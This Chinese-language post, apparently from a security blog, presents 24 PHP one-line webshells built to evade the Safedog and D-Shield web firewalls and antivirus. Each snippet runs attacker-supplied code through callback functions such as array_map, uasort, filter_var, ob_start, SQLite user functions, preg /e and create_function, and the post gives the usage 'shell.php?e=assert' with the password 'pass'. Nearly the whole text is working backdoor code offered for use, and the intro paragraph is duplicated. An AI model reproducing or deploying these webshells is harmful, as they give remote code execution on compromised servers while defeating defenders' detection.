
过狗过盾无特征无动态函数PHP一句话
==================


分享些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5.4.8+、或sqlite/pdo/yaml/memcached扩展等）

原理：https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html  
所有一句话使用方法基本都是：  
http:// target/shell.php?e=assert 密码pass

分享些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。（少部分一句话需要php5.4.8+、或sqlite/pdo/yaml/memcached扩展等）

原理：https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html  
所有一句话使用方法基本都是：  
http:// target/shell.php?e=assert 密码pass

01


```
$e = $_REQUEST\['e'\];
$arr = array($_POST\['pass'\],);
array_filter($arr, $e);
```


02


```
$e = $_REQUEST\['e'\];
$arr = array($_POST\['pass'\],);
array_map($e, $arr);

```

03


```
$e = $_REQUEST\['e'\];
$arr = array('test', $_REQUEST\['pass'\]);
uasort($arr, $e);

```

04


```
$e = $_REQUEST\['e'\];
$arr = array('test' => 1, $_REQUEST\['pass'\] => 2);
uksort($arr, $e);

```

05


```
$arr = new ArrayObject(array('test', $_REQUEST\['pass'\]));
$arr->uasort('assert');
```


06


```
$arr = new ArrayObject(array('test' => 1, $_REQUEST\['pass'\] => 2));
$arr->uksort('assert');
```


07


```
$e = $_REQUEST\['e'\];
$arr = array(1);
array\_reduce($arr, $e, $\_POST\['pass'\]);
```


08


```
$e = $_REQUEST\['e'\];
$arr = array($_POST\['pass'\]);
$arr2 = array(1);
array_udiff($arr, $arr2, $e);
```


09


```
$e = $_REQUEST\['e'\];
$arr = array($_POST\['pass'\] => '|.*|e',);
array_walk($arr, $e, '');

```

10


```
$e = $_REQUEST\['e'\];
$arr = array($_POST\['pass'\] => '|.*|e',);
array\_walk\_recursive($arr, $e, '');

```

11

```
mb\_ereg\_replace('.*', $_REQUEST\['pass'\], '', 'e');
```


12


```
echo preg\_filter('|.*|e', $\_REQUEST\['pass'\], '');
```


13


```
ob_start('assert');
echo $_REQUEST\['pass'\];
ob\_end\_flush();
```


14


```
$e = $_REQUEST\['e'\];
register\_shutdown\_function($e, $_REQUEST\['pass'\]);

```

15


```
$e = $_REQUEST\['e'\];
declare(ticks=1);
register\_tick\_function($e, $_REQUEST\['pass'\]);
```


16


```
filter\_var($\_REQUEST\['pass'\], FILTER_CALLBACK, array('options' => 'assert'));
```


17


```
filter\_var\_array(array('test' => $\_REQUEST\['pass'\]), array('test' => array('filter' => FILTER\_CALLBACK, 'options' => 'assert')));
```


18


```
$e = $_REQUEST\['e'\];
$db = new PDO('sqlite:sqlite.db3');
$db->sqliteCreateFunction('myfunc', $e, 1);
$sth = $db->prepare("SELECT myfunc(:exec)");
$sth->execute(array(':exec' => $_REQUEST\['pass'\]));
```


19


```
$e = $_REQUEST\['e'\];
$db = new SQLite3('sqlite.db3');
$db->createFunction('myfunc', $e);
$stmt = $db->prepare("SELECT myfunc(?)");
$stmt->bindValue(1, $\_REQUEST\['pass'\], SQLITE3\_TEXT);
$stmt->execute();
```


20


```
$str = urlencode($_REQUEST\['pass'\]);
$yaml = <<<EOD
greeting: !{$str} "|.+|e"
EOD;
$parsed = yaml\_parse($yaml, 0, $cnt, array("!{$\_REQUEST\['pass'\]}" => 'preg_replace'));
```


21


```
$mem = new Memcache();
$re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
$mem->connect($_REQUEST\['pass'\], 11211, 0);
```


22


```
preg\_replace\_callback('/.+/i', create\_function('$arr', 'return assert($arr\[0\]);'), $\_REQUEST\['pass'\]);

```

23

```

mb\_ereg\_replace\_callback('.+', create\_function('$arr', 'return assert($arr\[0\]);'), $_REQUEST\['pass'\]);

```

24


```
$iterator = new CallbackFilterIterator(new ArrayIterator(array($\_REQUEST\['pass'\],)), create\_function('$a', 'assert($a);'));
foreach ($iterator as $item) {echo $item;}

```


